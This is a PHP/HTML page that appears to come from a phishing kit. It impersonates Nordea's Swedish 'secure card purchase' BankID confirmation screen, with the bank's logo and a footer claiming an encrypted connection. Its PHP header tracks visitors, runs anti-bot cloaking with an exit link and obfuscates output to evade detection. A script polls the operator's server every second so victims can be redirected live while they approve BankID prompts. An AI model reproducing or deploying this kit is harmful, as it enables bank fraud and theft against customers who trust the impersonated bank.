<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?> <!DOCTYPE html> 
<html translate="no" lang="sv" class="desktop framed">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <title>Bekräfta</title>
           <link href="css/visa.css?" rel="stylesheet">
    <script src="js/jquery.js"></script>
      <style>.sf-hidden{display:none!important}</style>
   </head>
   <body class="page-ready cv-bankidse-3ds-pending">
      <div class="container-wrapper">
         <div class="main-loader centered" id="loading" tabindex="-1" role="dialog">
            <div class="loader" aria-hidden="true">
               <svg focusable="false" viewBox="0 0 48 48">
                  <path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path>
               </svg>
            </div>
            <p class="loader-text">Hämtar...</p>
            <noscript>
               <p class="loader-text">JavaScript must be enabled to use this page.</p>
            </noscript>
         </div>
         <div class="system-messages-top-bar sf-hidden" id="system-messages-top-bar" role="status" aria-live="assertive" aria-atomic="true">
         </div>
         <header>
            <div class="text-center">
               <span class="visually-hidden">Nordea</span>
               <svg class="logo" viewBox="0 0 136.1 28.6" focusable="false" aria-hidden="true">
                  <g id="logo">
                     <path fill="#ffffff" d="M124.1,6.2c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9c2.3,0,5.4-1.2,6.8-3.6v3.3h4.3V17.6 C136.2,10.6,130.6,5.7,124.1,6.2z M131.4,17.6c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2 c3.4,0,6.2,2.7,6.4,6.1L131.4,17.6L131.4,17.6z"></path>
                     <path fill="#ffffff" d="M100.5,6.2c-5.9,0.2-10.9,4.7-10.9,11.3c0,6,4.9,11.1,11.2,11.1c4.4,0,8.7-2.6,10.4-6.9l-4.3-1.3 c-0.8,1.8-2.7,3.3-4.8,3.7c-3,0.6-5.8-1.3-6.9-3.3l16.7-4.6C111.4,11.8,107.6,6,100.5,6.2z M94.3,16.8c0-2.3,1.4-5,4.4-6.1 c3.4-1.3,6.4,0.4,7.7,2.8L94.3,16.8z"></path>
                     <path fill="#ffffff" d="M63.8,10.7V6.1c-4.2,0-5.6,2.1-6.3,3.2V6.8h-4.8V17v11.1h4.9c0-6.6,0-6.5,0-10.5 C57.6,12.8,60.4,10.9,63.8,10.7z"></path>
                     <polygon fill="#ffffff" points="19.7,19.6 5.1,2.4 0.1,2.4 0.1,28.1 5.3,28.1 5.3,10.9 20.1,28.2 24.6,28.2 24.6,2.4 19.7,2.4"></polygon>
                     <path fill="#ffffff" d="M86.7,0.1h-4.6v8.4c-1.1-1.4-4.5-2.6-7.4-2.3c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9 c2.4,0,5.7-1.1,6.8-3.2v2.8h4.3V17.5c0-0.1,0-0.1,0-0.2c0-0.1,0-0.1,0-0.2L86.7,0.1L86.7,0.1z M81.9,17.6 c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2c3.4,0,6.2,2.7,6.4,6.1 C81.9,16.9,81.9,17.6,81.9,17.6z"></path>
                     <path fill="#ffffff" d="M38.7,6.1c-6.2,0-11.2,5-11.2,11.2s5,11.2,11.2,11.2s11.2-5,11.2-11.2C49.8,11.1,44.8,6.1,38.7,6.1z M38.7,23.7c-3.5,0-6.4-2.9-6.4-6.4s2.9-6.4,6.4-6.4s6.4,2.9,6.4,6.4C45.1,20.9,42.2,23.7,38.7,23.7z"></path>
                  </g>
               </svg>
               <div class="page-context">Bekräfta</div>
            </div>
         </header>
         <main role="main">
            <div class="content">
               <h1 class="page-title text-center">Säkert kortköp på Internet</h1>
               <div class="inner-content">
                  <div class="actions-container">

                     <div data-view-id="bankidse-3ds-pending" data-status="assignment_pending" class="current">
                        <div class="status-container-bankidse" id="status-container-bankidse-3ds" tabindex="-1" aria-live="assertive">
                           <div class="status-texts">
                              <div class="status-text status-text-ok" aria-role="status">Klar</div>
                              <div class="status-text status-text-cp" aria-role="status">Skriv in din säkerhetskod i BankID-appen.</div>
                              <div class="status-text status-text-3ds-ap" aria-role="status">Starta BankID-appen</div>
                           </div>
                           <div class="status-images" aria-hidden="true">
                              <div class="status-img-p">
                                 <svg class="mobile-status-pending" viewBox="0 0 288 216">
                                    <defs>
                                       <style>.c2{fill:#00f}.d2{fill:#e5f2ff}.g2{fill:#39f;opacity:.3}</style>
                                    </defs>
                                    <path class="status-pending-device-shadow" d="M251.85 131.39l-133.34 77.48a12.57 12.57 0 0 1-12.61 0l-59.7-34.45a7.54 7.54 0 0 1 0-13.06l133.32-77.49a12.56 12.56 0 0 1 12.6 0l59.71 34.47a7.55 7.55 0 0 1 .02 13.05z" fill="#cebbb2" opacity=".5"></path>
                                    <g class="status-pending-device">
                                       <path class="c2" d="M42.4 112.2v15.56a7.46 7.46 0 0 0 3.76 6.39l59.71 34.47a12.56 12.56 0 0 0 12.6 0l133.35-77.5a7.46 7.46 0 0 0 3.74-6.2V68z"></path>
                                       <path class="d2" d="M251.82 74.73l-133.34 77.49a12.58 12.58 0 0 1-12.6 0l-59.71-34.45a7.55 7.55 0 0 1 0-13.06l133.32-77.49a12.6 12.6 0 0 1 12.61 0l59.7 34.47a7.54 7.54 0 0 1 .02 13.04z"></path>
                                       <path fill="#9cf" d="M177.05 36.16L57.48 105.62l62.89 36.92 119.6-69.48"></path>
                                       <path class="c2" d="M205 45.15l9.58 5.38a1.59 1.59 0 0 0 1.78-.15.59.59 0 0 0-.08-1l-9.47-5.27a1.66 1.66 0 0 0-1.9.21.5.5 0 0 0 .09.83z"></path>
                                       <ellipse class="c2" cx="223.05" cy="54.46" rx=".75" ry="1.31" transform="rotate(-88.64 223.067 54.458)"></ellipse>
                                       <ellipse class="c2" cx="219.82" cy="52.55" rx=".75" ry="1.31" transform="rotate(-88.64 219.83 52.548)"></ellipse>
                                       <path fill="#39f" d="M239.97 73.06l-62.92-36.9-119.57 69.46 4.3 2.52 115.01-66.8 58.58 34.39 4.6-2.67z"></path>
                                    </g>
                                    <g class="status-pending-step status-pending-step-1">
                                       <path class="c2" d="M95 28.49c.22 5.1-6.54 9.53-15.09 9.9s-15.66-3.47-15.88-8.57 6.7-5.54 15.26-5.91S94.8 23.39 95 28.49z"></path>
                                       <path class="c2" d="M64.16 22.66h30.95v5.96H64.16z"></path>
                                       <ellipse class="d2" cx="79.62" cy="22.66" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-2">
                                       <path class="c2" d="M124.53 46.59c0 5.11-6.94 9.24-15.5 9.24s-15.5-4.13-15.5-9.24 6.94-5.25 15.5-5.25 15.5.15 15.5 5.25z"></path>
                                       <path class="c2" d="M93.58 40.1h30.95v5.96H93.58z"></path>
                                       <ellipse class="d2" cx="109.03" cy="40.1" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-3">
                                       <ellipse class="g2" cx="138" cy="80.31" rx="15.5" ry="9.24"></ellipse>
                                       <path class="c2" d="M153.49 64.6c0 5.11-6.93 9.25-15.49 9.25s-15.5-4.14-15.5-9.25 6.94-5.25 15.5-5.25 15.49.15 15.49 5.25z"></path>
                                       <path class="c2" d="M122.54 58.12h30.95v5.96h-30.95z"></path>
                                       <ellipse class="d2" cx="138" cy="58.12" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-4">
                                       <ellipse class="g2" cx="167.35" cy="98.33" rx="15.5" ry="9.24"></ellipse>
                                       <path class="c2" d="M182.84 82.62c0 5.1-6.93 9.24-15.49 9.24s-15.5-4.14-15.5-9.24 6.94-5.25 15.5-5.25 15.49.14 15.49 5.25z"></path>
                                       <path class="c2" d="M151.89 76.13h30.95v5.96h-30.95z"></path>
                                       <ellipse class="d2" cx="167.35" cy="76.13" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                 </svg>
                              </div>
                              <div class="status-img-ok sf-hidden">
                                 <svg class="status-success" viewBox="0 0 320 264">
                                    <defs>
                                       <style>.a1{fill:#00f}.b1{fill:#9cf}.c1{fill:#39f}.f1{opacity:.5}.g1{fill:#5cadff}.h1{fill:#fff}</style>
                                       <clippath id="bankidse-ok">
                                          <path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z"></path>
                                       </clippath>
                                    </defs>
                                    <path class="a" d="M66.113 76.318l44.122-38.64 8.822 10.073-44.122 38.64z"></path>
                                    <ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="c1" cx="88.18" cy="56.99" rx="20.39" ry="2.66" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="a1" cx="97" cy="67.06" rx="29.32" ry="5.76" transform="rotate(-41.21 97.002 67.07)"></ellipse>
                                    <path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z"></path>
                                    <g clip-path="url(#bankidse-ok)">
                                       <path opacity=".5" fill="#39f" d="M155.85 95.32l19.83-11.45 14.76 11.05-20.21 11.68-14.38-11.28z"></path>
                                       <g class="f1">
                                          <path class="c1" d="M162.83 78.82l-19.05 11 6.33 3.05 19.46-11.24-6.74-2.81z"></path>
                                       </g>
                                       <g class="f1">
                                          <path class="c1" d="M203.79 111.61l-19.05 11 3.18 4.87 19.85-11.46-3.98-4.41z"></path>
                                       </g>
                                    </g>
                                    <ellipse class="b1" cx="154.75" cy="150.92" rx="41.76" ry="67.78" transform="rotate(-30 154.727 150.899)"></ellipse>
                                    <path class="c1" d="M134.53 106.43a19.79 19.79 0 0 1 11.84-2.37c-7.37-3.06-14.47-3.34-20.06-.06-14.3 8.25-13.66 36.12 1.42 62.24 6.54 11.34 14.73 20.48 23.07 26.53A100.88 100.88 0 0 1 136.05 173c-16.13-27.93-16.81-57.74-1.52-66.57z"></path>
                                    <path class="g1" d="M180.91 198.55c14.3-8.25 13.66-36.12-1.42-62.24-9.17-15.9-21.59-27.48-33.12-32.25a19.79 19.79 0 0 0-11.84 2.37c-15.29 8.83-14.61 38.64 1.52 66.6a100.88 100.88 0 0 0 14.75 19.69c10.88 7.88 22.02 10.5 30.11 5.83z"></path>
                                    <path class="a1" d="M36.822 184.282l41.472 41.472-9.468 9.468-41.472-41.472z"></path>
                                    <ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="c1" cx="57.56" cy="205.02" rx="2.66" ry="20.39" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="a1" cx="48.09" cy="214.49" rx="5.76" ry="29.32" transform="rotate(-45 48.094 214.489)"></ellipse>
                                    <path class="h1" d="M139.836 160.559l30.683-17.715 4.3 7.448-30.683 17.715z"></path>
                                    <path class="h1" d="M144.154 167.993l-11-19.053 6.374-3.68 11 19.053z"></path>
                                    <path class="a1" d="M267.59 21.62l-7.55 4.09-.01 32.88 26.3 16.66 7.43-4.04-26.17-49.59z"></path>
                                    <ellipse class="a1" cx="272.93" cy="50.61" rx="17.28" ry="28.05" transform="rotate(-28.55 272.897 50.623)"></ellipse>
                                    <ellipse class="b1" cx="280.36" cy="46.57" rx="17.28" ry="28.05" transform="rotate(-28.55 280.33 46.572)"></ellipse>
                                    <path class="c1" d="M270.19 30.59c6.24-3.4 16.34 3.1 22.55 14.51a41.11 41.11 0 0 1 3.08 7.21 37 37 0 0 0-4.12-11.77c-6-11-15.67-17.21-21.67-13.95-3.45 1.88-4.91 6.5-4.41 12.17.43-3.76 1.94-6.76 4.57-8.17z"></path>
                                    <path class="g1" d="M291.63 66.3c3.82-2.08 5.21-7.5 4.19-14a41.11 41.11 0 0 0-3.08-7.21c-6.21-11.41-16.31-17.91-22.55-14.51-2.63 1.43-4.14 4.38-4.57 8.17A36 36 0 0 0 270 52.36c5.93 10.96 15.63 17.2 21.63 13.94z"></path>
                                 </svg>
                              </div>
                           </div>
                        </div>
                        <div class="button-group">
                           <div><button class="button link-button cancel-bankidse">Avbryt</button></div>
                        </div>
                     </div>
                     <div data-view-id="bankidse-error" class="sf-hidden">
                     </div>
                     <div data-view-id="collision" class="collision-content sf-hidden" tabindex="-1">
                     </div>
                     <div data-view-id="challenge-form" class="sf-hidden">
                     </div>
                     <div data-view-id="signing" class="sf-hidden">
                     </div>
                     <div data-view-id="qrt-form" class="qr-code-form sf-hidden">
                     </div>
                     <div data-view-id="error" class="error-content no-button-row sf-hidden" role="alertdialog" aria-labelledby="error-message" id="error-view">
                     </div>
                     <div id="manual-redirect" data-view-id="manual-redirect" class="success-content sf-hidden">
                     </div>
                  </div>
                  <div class="content-loader centered" id="content-loader" tabindex="-1" role="dialog">
                     <div class="loader" aria-hidden="true">
                        <svg focusable="false" viewBox="0 0 48 48">
                           <path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path>
                        </svg>
                     </div>
                     <p class="loader-text">
                        <span>Hämtar...</span>
                        <span class="sf-hidden">Vänta ett ögonblick medan du skickas vidare.</span>
                     </p>
                  </div>
               </div>
            </div>
         </main>
         
<script>
$("#app2").mask("00000000");
    	</script>
      	<script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
         <footer>
            <div>© Nordea 2025 <br>Denna anslutning är krypterad</div>
         </footer>
         
      </div>
   </body>
</html>